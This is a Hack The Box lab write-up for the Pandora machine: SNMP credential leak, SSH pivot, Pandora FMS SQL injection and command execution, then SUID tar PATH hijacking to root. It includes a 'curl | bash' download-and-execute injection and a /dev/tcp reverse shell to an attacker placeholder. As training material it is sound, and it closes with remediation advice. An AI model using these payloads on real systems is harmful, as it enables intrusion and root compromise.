---
title: "Pandora — SNMP Credential Leak to Pandora FMS Session Hijacking and SUID PATH Hijacking"
seoTitle: "Pandora — SNMP Credential Leak and SUID PATH Hijacking"
description: "SNMP enumeration leaks credentials for SSH access; an internal Pandora FMS instance reached through SSH dynamic forwarding is SQL-injected for session hijacking, and a SUID backup binary calling tar by relative name enables PATH hijacking to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - snmp
  - sql-injection
  - suid
  - path-hijacking
objective: "Reach user and root access from unauthenticated network exposure by chaining an SNMP credential leak, an internal-only monitoring application, and a SUID backup binary."
tools:
  - rustscan
  - feroxbuster
  - snmpwalk
  - ssh
  - sqlmap
  - proxychains
  - Burp Suite
  - strings
  - netcat
skill: "Internal application exploitation and SUID PATH hijacking"
outcome: "SSH shell as the initial account, Pandora FMS session hijacking and application code execution as the application account, and root via a SUID binary that invokes tar by relative name"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu); OpenSSH 8.2p1, Apache httpd 2.4.41, and Pandora FMS 7.0NG.742 |
| Starting position | Unauthenticated network access |
| Objective | Move from unauthenticated enumeration to user and root access through a credential leak, an internal monitoring service, and a local misconfiguration |
| Outcome | SSH shell as the initial account; application code execution and a shell as the application account; root via SUID PATH hijacking |

## From SNMP leak to SUID tar hijack

Pandora is an Easy-rated Hack The Box Linux lab whose path begins with UDP enumeration: an SNMP walk using the default community string exposes a cleartext host-check credential for `<INITIAL_ACCESS_ACCOUNT>`, which grants SSH access. From that shell, an Apache virtual-host configuration reveals a Pandora FMS instance bound to localhost; an SSH dynamic forward exposes it, and a SQL injection in `chart_generator.php` dumps a live session that authenticates as `<APPLICATION_ACCOUNT>`. An authenticated command-execution flaw in the Events AJAX endpoint yields a shell as that account, and a SUID backup binary that calls `tar` by relative name allows PATH hijacking to root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/). Several transitions (the virtual-host disclosure, the session-table dump, and the confirmed command execution) were documented without retained terminal output; I could not verify them against captured output and state them as recorded.

**Attack path:** **SNMP community-string enumeration → cleartext SSH credential → internal Pandora FMS discovery → SQL injection session hijacking → authenticated command execution → SUID `tar` PATH hijacking → root**

## Ubuntu SSH and Apache host from unauthenticated enumeration

- **Target:** an Ubuntu host exposing SSH (OpenSSH 8.2p1) and Apache httpd 2.4.41 over TCP, plus SNMP over UDP.
- **Web front end:** identifies itself as `<TARGET_HOST>`, so a local hosts-file entry is required to browse by name.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** enumerate the attack surface, pivot through an internal monitoring application, and escalate to root.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: SNMP credential to SUID tar PATH

### 1. TCP Enumeration

Observation: the initial TCP scan exposes only SSH and HTTP.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Significance: two services with no immediate path; the web page references `<TARGET_HOST>`.

Result: SSH and Apache on an Ubuntu host. Content discovery against the public site did not expose a usable path:

```bash
feroxbuster --url http://<TARGET_IP> --wordlist <WEB_CONTENT_WORDLIST>
```

### 2. UDP Scanning and SNMP Credential Leak

Observation: with only two TCP services exposed, UDP scanning reveals SNMP.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sU -sC -sV -oN <SCAN_OUTPUT>
```

```text
161/udp open  snmp  SNMPv1 server
```

Action: query SNMP with the default `public` community string.

```bash
snmpwalk -v 1 -c public <TARGET_IP>
```

The walk returns process information containing a host-check command with a cleartext credential:

```text
<INITIAL_ACCESS_ACCOUNT> : <SNMP_CREDENTIAL>
```

Significance: SNMP process listings can expose command lines, and this one carries a reusable credential for an interactive service.

Result: a credential pair for `<INITIAL_ACCESS_ACCOUNT>` is recovered and subsequently validated through SSH.

### 3. SSH Initial Access

Observation: SSH is the exposed interactive service, and the SNMP-derived credential fits it directly.

```bash
ssh <INITIAL_ACCESS_ACCOUNT>@<TARGET_IP>
```

```text
<INITIAL_ACCESS_ACCOUNT>@<TARGET_HOST>:~$ whoami
<INITIAL_ACCESS_ACCOUNT>
```

Significance: the credential leaked by SNMP authenticates over SSH, so network enumeration becomes a shell.

Result: a user-level shell as `<INITIAL_ACCESS_ACCOUNT>`; because the user flag belongs to `<APPLICATION_ACCOUNT>`, lateral movement is required.

### 4. Internal Pandora FMS Discovery

Observation: the Apache virtual-host configuration on the host points at an application served only on loopback.

```bash
cat /etc/apache2/sites-enabled/pandora.conf
```

Significance: the configuration exposes a Pandora FMS instance rooted at `/var/www/pandora` and bound to localhost, which is not directly reachable from the attack machine.

Result: an internal-only web application is identified. Reach it by opening an SSH dynamic forward and tunneling browser or tool traffic through it:

```bash
ssh -D <PROXY_PORT> <INITIAL_ACCESS_ACCOUNT>@<TARGET_IP>
```

Browsing `http://localhost/pandora_console/` through the SOCKS proxy discloses the application version:

```text
Pandora FMS v7.0NG.742_FIX_PERL2020
```

Significance: this version is affected by the `chart_generator.php` SQL injection (CVE-2021-32099) and, per the Rapid7 Metasploit module, the Events-feature command execution (CVE-2020-13851); NVD records that CVE against 7.44.

Result: the deployed version is identified as a vulnerable Pandora FMS build.

### 5. Pandora FMS SQL Injection: Session Hijacking

Observation: `chart_generator.php` is injectable through the `session_id` parameter on the disclosed version.

Action: route `sqlmap` through the SOCKS proxy with `proxychains` and dump the PHP session table.

```bash
proxychains sqlmap \
  -u "http://localhost/pandora_console/include/chart_generator.php?session_id=''" \
  -D pandora -T tsessions_php --dump
```

Significance: `tsessions_php` stores live PHP session identifiers; a dumped identifier is a bearer token that can be replayed as an authenticated session without credentials.

Result: the dump contained a live session for `<APPLICATION_ACCOUNT>`; visiting the vulnerable endpoint with `<APPLICATION_SESSION_ID>` authenticated the dashboard as that account.

### 6. Authenticated Command Execution

Observation: as `<APPLICATION_ACCOUNT>`, the Events AJAX endpoint passes a request parameter into a system command.

Action: capture the Events request in Burp Suite and substitute the `target` parameter with a benign command to confirm execution.

```http
POST /pandora_console/ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<APPLICATION_SESSION_ID>

page=include/ajax/events&perform_event_response=10000000&target=whoami
```

Significance: the response returned the command output, which confirms that the application executes the supplied `target` value as `<APPLICATION_ACCOUNT>`.

Result: authenticated command execution as the web application account. I then obtained an interactive shell through a download-and-execute callback issued via the same primitive:

```text
target=curl <PAYLOAD_URL> | bash
```

```text
<APPLICATION_ACCOUNT>@<TARGET_HOST>:/var/www/pandora/pandora_console$ whoami
<APPLICATION_ACCOUNT>
```

### 7. SUID PATH Hijacking

Observation: SUID enumeration on the host surfaces a non-standard binary.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/pandora_backup
```

```bash
ls -la /usr/bin/pandora_backup
```

```text
-rwsr-x--- 1 root <APPLICATION_ACCOUNT> ... /usr/bin/pandora_backup
```

Significance: the binary runs with the setuid bit owned by root and is executable by the application account's group, so it is the local escalation target.

Result: a setuid-root backup utility is exposed to the current shell. I copied the binary off the host for analysis and checked its embedded strings to see how it invokes a dependency:

```bash
strings <BINARY>
```

```text
tar -cvf /root/.backup/pandora-backup.tar.gz ...
```

Significance: the privileged binary calls `tar` by relative name, so command resolution follows `PATH` and an attacker-controlled directory can supply the binary it runs.

Action: stage a replacement `tar` earlier in `PATH`, then execute the SUID binary and catch the callback.

```bash
cat > /tmp/tar << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTEN_PORT> 0>&1
EOF
chmod +x /tmp/tar
export PATH=/tmp:$PATH
nc -nlvp <LISTEN_PORT>
/usr/bin/pandora_backup
```

```text
<PRIVILEGED_ACCOUNT>@<TARGET_HOST>:~# whoami
root
```

Result: the privileged context executes the substituted `tar` and returns a root shell.

## No TCP path, a loopback service, and a relative tar call

| Challenge | Decision | Rationale |
|---|---|---|
| TCP scan exposed no usable path | Expanded to UDP scanning | The SNMP service was not visible on TCP |
| Pandora FMS bound to localhost only | Reached through an SSH dynamic forward | The internal service is not directly routable from the attack machine |
| Backup binary resolved a dependency by name | Supplied a replacement `tar` earlier in `PATH` | A setuid-root process follows `PATH` when it invokes `tar` relatively |

## Outcome: SSH access, application code execution, and root

The documented path includes user-level SSH access as the initial account, application-account code execution, and root through a setuid-root backup binary that invokes `tar` by relative name. Flag files are not reproduced.

## Recommendations: default SNMP, internal exposure, the injection, and relative paths

The observed compromise informs these recommendations; the exercise did not test them.

1. **SNMP exposed with the default community string.** An unauthenticated SNMP walk returned process command lines containing a reusable cleartext credential. *Recommendation:* disable SNMP where it is not required, restrict it to a management network, replace default community strings, and keep credentials out of process arguments. *Detection:* alert when inbound SNMP queries come from unexpected sources; scan process listings for credential-shaped strings.
2. **Internal-only application reachable after a foothold.** A localhost-bound monitoring service was exposed through an SSH dynamic forward. *Recommendation:* treat loopback binding as defense in depth, not an access boundary; segment management services and enforce host-based access controls. *Detection:* monitor dynamic port forwarding and alert when interactive sessions access loopback-only services unusually.
3. **SQL injection in the session table.** `chart_generator.php` injected through `session_id`, letting the session store be dumped (CVE-2021-32099). *Recommendation:* upgrade Pandora FMS to a fixed release, parameterize database queries, and treat session identifiers as secrets with short lifetimes. *Detection:* monitor for injection patterns against application parameters and for session identifiers replayed from anomalous clients.
4. **Authenticated command execution in the Events feature.** The Events AJAX endpoint passed a parameter into a system command (CVE-2020-13851). *Recommendation:* upgrade to a fixed release, restrict the Events feature to trusted roles, and run the web application under a least-privileged account. *Detection:* alert when POST requests to `ajax.php` contain command-like `target` values.
5. **Privileged binary invoking a dependency by relative name.** The setuid-root backup utility called `tar` without an absolute path. *Recommendation:* invoke dependencies by absolute path in privileged binaries, set a safe `PATH` and environment before privileged execution, and minimize the setuid attack surface. *Detection:* audit setuid binaries for relative-path command invocations.

## References

- [Hack The Box — Pandora](https://app.hackthebox.com/machines/Pandora) (retired machine)
- [NVD — CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099) (Pandora FMS 742 unauthenticated SQL injection in `chart_generator.php`, leading to session privilege escalation)
- [Pandora FMS 743 release notes](https://pandorafms.com/blog/whats-new-in-pandora-fms-743/) (vendor release that addresses the 742 vulnerabilities)
- [NVD — CVE-2020-13851](https://nvd.nist.gov/vuln/detail/CVE-2020-13851) (records the Events-feature command execution against Pandora FMS 7.44)
- [Rapid7 — Pandora FMS Events Remote Command Execution](https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/) (Metasploit module listing CVE-2020-13851 as affecting 7.0 NG 742, 743, and 744)
- [Core Security — Pandora FMS Community Multiple Vulnerabilities](https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities) (advisory for the Pandora FMS command-execution issues)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner fronting Nmap)
- [Nmap Reference Guide](https://nmap.org/book/man.html) (service/version scan flags used through RustScan)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [Net-SNMP](https://www.net-snmp.org/) (`snmpwalk` and the SNMP tooling)
- [OpenSSH — manual pages](https://www.openssh.com/manual.html) (SSH client and dynamic port forwarding)
- [sqlmap](https://github.com/sqlmapproject/sqlmap) (automated SQL injection and database extraction)
- [proxychains-ng](https://github.com/haad/proxychains) (routing tool traffic through a SOCKS proxy)
- [PortSwigger Burp Suite](https://portswigger.net/burp) (request capture and manipulation)
- [strings — GNU Binutils documentation](https://sourceware.org/binutils/docs/binutils/strings.html) (extracting embedded strings from a binary)
- [netcat](https://nc110.sourceforge.io/) (TCP listener for the callback shell)
- [Apache HTTP Server 2.4 documentation](https://httpd.apache.org/docs/2.4/) (virtual-host configuration)
